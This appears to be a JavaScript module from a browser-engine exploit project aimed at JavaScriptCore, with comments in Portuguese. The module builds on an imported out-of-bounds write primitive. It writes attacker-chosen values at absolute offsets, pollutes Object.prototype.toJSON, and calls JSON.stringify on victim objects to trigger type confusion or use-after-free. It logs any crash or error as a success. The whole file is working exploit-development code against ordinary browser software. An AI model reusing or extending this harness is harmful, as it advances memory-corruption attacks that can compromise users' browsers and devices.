// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

let callCount_toJSON_tc = 0;
const EARLY_CALL_THRESHOLD_FOR_DETAILED_ACCESS = 3; // Testar acessos detalhados nas primeiras X chamadas

async function executeSingleJsonTCTest_DetailedAccess(
    description,
    corruption_offset,
    value_to_write,
    enable_pp,
    attemptOOBWrite,
    victimFactory, // Função para criar o victim_ab
    logFn = logS3
) {
    const FNAME_SINGLE_TEST = `executeSingleJsonTCTest_DetailedAccess<${description}>`;
    logFn(`--- Iniciando Teste Especulativo (Acesso Detalhado): ${description} ---`, "test", FNAME_SINGLE_TEST);
    logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, PP: ${enable_pp}, Escrita OOB: ${attemptOOBWrite}`, "info", FNAME_SINGLE_TEST);

    callCount_toJSON_tc = 0;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logFn("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_SINGLE_TEST);
        return false;
    }

    let victim_ab = victimFactory(); // Cria a vítima usando a factory
    const victimType = victim_ab?.constructor?.name || typeof victim_ab;
    logFn(`ArrayBuffer/Objeto vítima (${victimType}) recriado.`, "info", FNAME_SINGLE_TEST);

    const ppKey = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let testSucceededSpeculatively = false;

    try {
        if (enable_pp) {
            logFn(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME_SINGLE_TEST);
            Object.defineProperty(Object.prototype, ppKey, {
                value: function() {
                    callCount_toJSON_tc++;
                    const currentOperationThis = this;
                    const logPrefixToJSON = `toJSON_DetailedAccess(Call ${callCount_toJSON_tc}, VictimType: ${victimType})`;

                    if (callCount_toJSON_tc <= EARLY_CALL_THRESHOLD_FOR_DETAILED_ACCESS) {
                        logFn(`[[[ ${logPrefixToJSON} INVOCADO ]]] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, 'vuln', FNAME_SINGLE_TEST);
                        try {
                            if (currentOperationThis === null || currentOperationThis === undefined) {
                                logFn(`    ${logPrefixToJSON} 'this' é NULL ou UNDEFINED! SUCESSO ESPECULATIVO!`, 'critical', FNAME_SINGLE_TEST);
                                testSucceededSpeculatively = true;
                                return { toJSON_this_is_null_or_undefined_da: true, call_count_da: callCount_toJSON_tc };
                            }

                            // Tentativas de acesso específicas baseadas no tipo esperado de victim_ab
                            if (victim_ab instanceof ArrayBuffer) {
                                logFn(`    ${logPrefixToJSON} Tentando acessar this.byteLength: ${currentOperationThis.byteLength}`, 'info');
                                // let s = currentOperationThis.slice(0,1); // slice pode ser muito complexo
                                // logFn(`    ${logPrefixToJSON} Tentativa this.slice(0,1) OK.`, 'info');
                            } else if (Array.isArray(victim_ab)) {
                                logFn(`    ${logPrefixToJSON} Tentando acessar this.length: ${currentOperationThis.length}`, 'info');
                                // let first = currentOperationThis[0];
                                // logFn(`    ${logPrefixToJSON} Tentativa this[0] OK.`, 'info');
                            } else if (typeof victim_ab === 'object' && victim_ab !== null) {
                                // Para objetos genéricos, podemos tentar listar chaves ou acessar uma propriedade de teste
                                const keysTest = Object.keys(currentOperationThis);
                                logFn(`    ${logPrefixToJSON} Object.keys(this) retornou ${keysTest.length} chaves.`, 'info');
                            }
                        } catch (e_prop_access) {
                            logFn(`    ${logPrefixToJSON} ERRO ao tentar acesso específico em 'this': ${e_prop_access.name} - ${e_prop_access.message}. SUCESSO ESPECULATIVO!`, 'critical', FNAME_SINGLE_TEST);
                            testSucceededSpeculatively = true;
                            return { toJSON_prop_access_error_da: true, message_da: e_prop_access.message, call_count_da: callCount_toJSON_tc };
                        }
                    } else if (callCount_toJSON_tc % 500 === 0) {
                         logFn(`[[[ ${logPrefixToJSON} INVOCADO (chamada ${callCount_toJSON_tc}) ]]]`, 'vuln', FNAME_SINGLE_TEST);
                    }

                    // Lógica original "simples" para continuar a recursão se os acessos detalhados não falharem
                    try {
                        const keys = Object.keys(this);
                        return { toJSON_executed_da: true, keys_da: keys, call_count_da: callCount_toJSON_tc };
                    } catch (e_keys_recursion) {
                        logFn(`[[[ ${logPrefixToJSON} ERRO em Object.keys(this) na recursão: ${e_keys_recursion.message}. SUCESSO ESPECULATIVO! ]]]`, 'critical', FNAME_SINGLE_TEST);
                        testSucceededSpeculatively = true;
                        return { toJSON_error_recursion_da: true, message_da: e_keys_recursion.message, call_count_da: callCount_toJSON_tc };
                    }
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logFn(`Object.prototype.${ppKey} poluído com lógica de acesso detalhado.`, "good", FNAME_SINGLE_TEST);
        }

        if (attemptOOBWrite) {
            const bytes_to_write_for_corruption = 4;
            if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_SINGLE_TEST);
                oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
            } else {
                 logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} inválido. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
            }
        }
        await PAUSE_S3(SHORT_PAUSE_S3);

        logFn(`>>> PRESTES A CHAMAR JSON.stringify(victim_ab) para teste: ${description}`, "info", FNAME_SINGLE_TEST);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab);
            logFn(`<<< RETORNO JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_SINGLE_TEST);
            if (stringifyResult && typeof stringifyResult === 'string' && 
                (stringifyResult.includes("toJSON_prop_access_error_da:true") || stringifyResult.includes("toJSON_this_is_null_or_undefined_da:true"))) {
                logFn("SUCESSO ESPECULATIVO (TC): Erro/Corrupção detectado DENTRO do toJSON (acesso detalhado).", "vuln", FNAME_SINGLE_TEST);
            }
        } catch (e) {
            logFn(`ERRO CRÍTICO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
            testSucceededSpeculatively = true;
        }

    } catch (mainIterationError) {
        logFn(`Erro principal na iteração do teste (${description}): ${mainIterationError.message}`, "error", FNAME_SINGLE_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        clearOOBEnvironment();
    }
    logFn(`--- Teste Especulativo (Acesso Detalhado) Concluído: ${description} (Sucesso Espec.: ${testSucceededSpeculatively}, Chamadas toJSON: ${callCount_toJSON_tc}) ---`, "test", FNAME_SINGLE_TEST);
    return testSucceededSpeculatively;
}

// Exportador para chamar o teste com diferentes vítimas
export async function runJsonTCDetailedAccessTest(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, victimFactory) {
    return await executeSingleJsonTCTest_DetailedAccess(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, victimFactory, logS3);
}
